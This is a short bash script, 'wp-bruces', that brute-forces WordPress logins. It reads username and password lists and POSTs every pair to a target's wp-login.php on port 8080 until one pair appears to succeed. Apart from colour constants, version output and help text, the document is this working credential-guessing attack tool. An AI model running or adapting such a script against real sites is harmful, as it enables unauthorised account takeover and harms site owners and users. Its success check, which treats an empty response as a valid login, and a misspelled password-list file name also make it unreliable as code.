#!/bin/bash

# Title: WordPress Brute forCE Script (wp-bruces) 
# Developed by Sérgio Corrêa
# Date: 21/07/2022
# Tested on: MacOS / Linux

### Constants to help to use colors.

RED='\033[31;1m'
GREEN='\033[32;1m'
END='\033[m'

### Function to display the Version.

function Version(){

   echo -e "${GREEN}Version 1.0${END}"

} 

### Function to display the Help Painel.

function Help(){

   echo -e "${RED} [*] How to run: ./wp-bruces.sh [options] ${END}"
   echo -e "${RED} [*] ./wp-bruces -u example-ctf.com ${END}"
   echo -e "${GREEN}options: ${END}"
   echo -e "${GREEN}   -u    URL or IP. ${END}"
   echo -e "${GREEN}   -h    Help Options. ${END}"
   echo -e "${GREEN}   -v    Software Version. ${END}"

}

### Check null argument and show the help painel.

if [ -z "$1" ] ; then

   Help

   exit

fi

### Function to check username and password

function Check(){

CONN=$(curl -Is $OPTARG:8080 --connect-timeout 1 | head -n1 | awk '{print $3}')

if [ -z "$CONN" ] ; then

   echo -e "${RED}[*] Check the URL/IP - No connection to the target  ${END}"

   exit

else

   for user in $(cat users_list.txt) ; do

	  for password in $(cat passords_list.txt) ; do

		 curl -s -X POST $OPTARG:8080/wp-login.php --data "log=$user&pwd=$password&wp-submit=Acessar" > /tmp/wp-bruces.log

		 	if [ -z "$(cat /tmp/wp-bruces.log)" ] ; then

				echo -e "${GREEN}[*] Found Username: "$user" and Password: "$password" ${END}"

				exit
			fi
	  done

   done
fi

echo -e "${RED}[*] Credential not found ${END}"

}

### Executing script options.

while getopts "u:vh" options; do

   case $options in
   
         h)
            Help
      ;;
         
         v)
            Version
      ;;
         
         u)

	   Check
      ;;
   
   esac

done
